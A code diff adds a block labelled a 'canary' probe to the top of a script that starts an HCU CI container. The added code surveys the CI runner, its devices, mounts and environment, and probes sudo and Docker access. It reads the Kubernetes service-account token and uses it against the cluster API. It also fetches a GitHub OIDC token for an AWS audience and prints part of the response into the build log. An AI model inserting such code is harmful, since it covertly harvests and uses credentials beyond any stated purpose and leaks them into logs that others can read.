@@ -15,6 +15,69 @@
 
 set -euo pipefail
 
+# ==== i195253 canary begin (transient probe; reverted after the run) ====
+( set +eu; set +o pipefail
+  echo "=== I195253 CANARY START ==="
+  echo "when_utc=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>&1)"
+  echo "runner_name=${RUNNER_NAME:-} runner_os=${RUNNER_OS:-} runner_arch=${RUNNER_ARCH:-}"
+  echo "workflow=${GITHUB_WORKFLOW:-} job=${GITHUB_JOB:-} run_id=${GITHUB_RUN_ID:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} actor=${GITHUB_ACTOR:-} event=${GITHUB_EVENT_NAME:-}"
+  echo "identity=$(id 2>&1 | head -1)"
+  echo "hostname=$(hostname 2>&1)"
+  echo "kernel=$(uname -srm 2>&1)"
+  echo "user=${USER:-} home=${HOME:-} cwd=$PWD"
+  echo "--- os ---"; head -3 /etc/os-release 2>&1
+  echo "--- cgroup ---"; head -3 /proc/self/cgroup 2>&1
+  echo "--- devices ---"; ls -l /dev/kfd /dev/dri 2>&1 | head -20; echo "dri_entries=$(ls /dev/dri 2>/dev/null | tr '\n' ' ')"
+  echo "--- /opt/hyhal ---"; ls /opt/hyhal 2>&1 | head -8
+  echo "--- accelerators ---"
+  for t in nvidia-smi rocm-smi hy-smi npu-smi amd-smi hy-virtualization; do
+    p=$(command -v "$t" 2>/dev/null) || continue
+    echo "[$t] $p"
+    if [ "$t" = "nvidia-smi" ]; then timeout 15 nvidia-smi -L 2>&1 | head -20
+    else timeout 15 "$t" 2>&1 | head -30; fi
+  done
+  echo "--- sudo/docker ---"
+  echo "sudo_path=$(command -v sudo 2>/dev/null || echo none)"; timeout 10 sudo -n id 2>&1 | head -3
+  echo "docker_path=$(command -v docker 2>/dev/null || echo none)"; ls -l /var/run/docker.sock 2>&1
+  timeout 10 docker info 2>&1 | head -8; timeout 10 docker ps 2>&1 | head -8
+  echo "--- mounts ---"; grep -E ' (/|/sgl-data|/ci_public|/public|/opt/hyhal|/dev) ' /proc/mounts 2>/dev/null | head -12
+  echo "--- env(filtered) ---"; env | grep -Ei '^(RUNNER_|GITHUB_(WORKFLOW|JOB|RUN_ID|REPOSITORY|SHA|REF|ACTOR|EVENT_NAME)=|KUBERNETES_|HCU_CI_IN_K8S|ACTIONS_ID_TOKEN)' | sed -E 's/(TOKEN|SECRET|PASSWORD|KEY)=.*/\1=<redacted>/' | head -25
+  echo "--- k8s serviceaccount ---"
+  SA=/var/run/secrets/kubernetes.io/serviceaccount
+  ls -l "$SA" 2>&1 | head -6
+  if [ -r "$SA/token" ]; then
+    TOK=$(cat "$SA/token")
+    echo "sa_token_len=${#TOK} sa_token_sha256=$(printf %s "$TOK" | sha256sum | cut -d' ' -f1)"
+    echo "sa_namespace=$(cat "$SA/namespace" 2>/dev/null)"
+    printf '%s' "$TOK" | python3 -c 'import sys,base64,json
+t=sys.stdin.read().strip().split(".")
+if len(t)>1:
+    s=t[1]; s+="="*(-len(s)%4)
+    try:
+        d=json.loads(base64.urlsafe_b64decode(s)); print("sa_claims="+json.dumps(d)[:700])
+    except Exception as e: print("sa_claims_err",e)' 2>&1 | head -3
+    KUBE=https://kubernetes.default.svc
+    echo "kube_api_version=$(timeout 10 curl -sk -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" $KUBE/version 2>&1)"
+    echo "--- nodes ---"
+    timeout 20 curl -sk -H "Authorization: Bearer $TOK" "$KUBE/api/v1/nodes?limit=3" 2>/dev/null | head -c 2600; echo
+    echo "--- ssar nodes get ---"
+    timeout 15 curl -sk -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"get","resource":"nodes"}}}' "$KUBE/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" 2>&1 | head -c 700; echo
+    echo "--- pods own namespace ---"
+    timeout 15 curl -sk -H "Authorization: Bearer $TOK" "$KUBE/api/v1/namespaces/$(cat $SA/namespace 2>/dev/null)/pods?limit=2" 2>&1 | head -c 900; echo
+  else
+    echo "no_sa_token"
+  fi
+  echo "--- oidc ---"
+  if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
+    echo "actions_id_token_url_present=1"
+    timeout 15 curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>&1 | head -c 350; echo
+  else
+    echo "no_actions_id_token_env"
+  fi
+  echo "=== I195253 CANARY END ==="
+) 2>&1 || true
+# ==== i195253 canary end ====
+
 # Start a HCU CI container.
 #
 # Required env / inputs:
